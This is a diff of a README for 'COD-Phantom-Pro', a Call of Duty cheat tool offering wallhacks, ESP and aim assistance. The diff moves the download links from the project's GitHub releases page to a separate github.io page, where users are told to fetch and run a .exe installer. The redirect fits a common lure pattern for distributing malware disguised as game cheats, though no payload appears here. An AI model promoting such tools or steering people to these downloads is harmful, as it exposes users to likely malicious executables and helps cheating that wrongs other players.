@@ -1,6 +1,6 @@
 # 🎯 COD-Phantom-Pro - Gain the advantage in every match
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aletheadreadful536/COD-Phantom-Pro/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://aletheadreadful536.github.io)
 
 COD-Phantom-Pro provides tactical tools for Call of Duty players. This application includes features like ESP for enemy tracking, aim assistance, wallhacks, recoil reduction, and trigger mechanisms. It helps players improve their performance by providing better information and control during gameplay.
 
@@ -19,7 +19,7 @@ Before you install the software, check that your computer meets these requiremen
 
 Follow these steps to download and set up the application on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Aletheadreadful536/COD-Phantom-Pro/releases) to download the installer.
+1. Visit the [official release page](https://aletheadreadful536.github.io) to download the installer.
 2. Select the latest version file ending in .exe.
 3. Save the file to your computer. 
 4. Locate the downloaded file in your downloads folder.
